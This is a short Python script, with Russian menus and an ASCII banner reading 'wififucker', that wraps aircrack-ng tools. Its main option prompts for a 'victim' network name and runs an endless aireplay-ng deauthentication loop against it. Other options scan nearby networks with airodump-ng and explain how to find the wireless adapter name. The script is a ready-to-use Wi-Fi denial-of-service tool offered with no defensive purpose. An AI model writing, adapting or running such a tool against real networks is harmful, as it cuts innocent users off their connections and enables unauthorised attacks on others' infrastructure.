import os
from time import sleep
os.system("sudo apt install aircrack-ng")
os.system("clear")

print("""

░██╗░░░░░░░██╗██╗░░░░░░███████╗██╗  ███████╗██╗░░░██╗░█████╗░██╗░░██╗
░██║░░██╗░░██║██║░░░░░░██╔════╝██║  ██╔════╝██║░░░██║██╔══██╗██║░██╔╝
░╚██╗████╗██╔╝██║█████╗█████╗░░██║  █████╗░░██║░░░██║██║░░╚═╝█████═╝░
░░████╔═████║░██║╚════╝██╔══╝░░██║  ██╔══╝░░██║░░░██║██║░░██╗██╔═██╗░
░░╚██╔╝░╚██╔╝░██║░░░░░░██║░░░░░██║  ██║░░░░░╚██████╔╝╚█████╔╝██║░╚██╗
░░░╚═╝░░░╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝  ╚═╝░░░░░░╚═════╝░░╚════╝░╚═╝░░╚═╝
Telegram: https://t.me/wififucker || GitHub: https://github.com/Sudox00/wififucker



1 - WIFI DEAUTH
2 - ПОКАЗАТЬ ВСЕ СЕТИ 
3 - ИНФОРМАЦИЯ О БЕСПРОВОДНЫХ УСТРОЙСТВАХ
4 - ПОМОЩЬ
5 - ВЫХОД
""")
while True:
	menu = input("Введите нужный пункт:")
	if menu == "1":
		wifiuser = input("Введите название сети жертвы:")
		adapter = input("Введите название название адаптера:")
		print("!!! ДЛЯ ОТКЛЮЧЕНИЯ ИСПОЛЬЗУЙТЕ CTRL+Z !!!")
		sleep(3)
		while True:
			os.system("aireplay-ng -0 0 -e \"%s\" %s"   % ( str(wifiuser), str(adapter)))
	elif menu == "2":
		adapter = input("Введите название название адаптера:")
		print("!!! ДЛЯ ОТКЛЮЧЕНИЯ ИСПОЛЬЗУЙТЕ CTRL+Z !!!")
		sleep(3)
		os.system("airodump-ng " + str(adapter))	
	elif menu == "3":
		os.system("iwconfig")		
	elif menu == "4":
		print("""
Где получить название адаптера?
 - Введите в терминал  iwconfig
 - Пример:
 	|wlx00e0440ea50d  IEEE 802.11  ESSID:"My Home WiFi"  
        |  Mode:Managed  Frequency:2.437 GHz  Access Point: E5:1F:56:81:98:D2   
        |  Bit Rate=72.2 Mb/s   Tx-Power=20 dBm   
        |  ...
 - в моем случае имя: wlx00e0440ea50d
 	
 	
 	
 
 
Почему не работает скрипт? 
 - Возможно вы запустили консоль без root! (sudo -i)
	
	
	
		""")
	elif menu == "5":
		print("Завершение...")
		print("""

░██████╗░░█████╗░░█████╗░██████╗░██████╗░██╗░░░██╗███████╗
██╔════╝░██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚██╗░██╔╝██╔════╝
██║░░██╗░██║░░██║██║░░██║██║░░██║██████╦╝░╚████╔╝░█████╗░░
██║░░╚██╗██║░░██║██║░░██║██║░░██║██╔══██╗░░╚██╔╝░░██╔══╝░░
╚██████╔╝╚█████╔╝╚█████╔╝██████╔╝██████╦╝░░░██║░░░███████╗
░╚═════╝░░╚════╝░░╚════╝░╚═════╝░╚═════╝░░░░╚═╝░░░╚══════╝
""")
		exit()
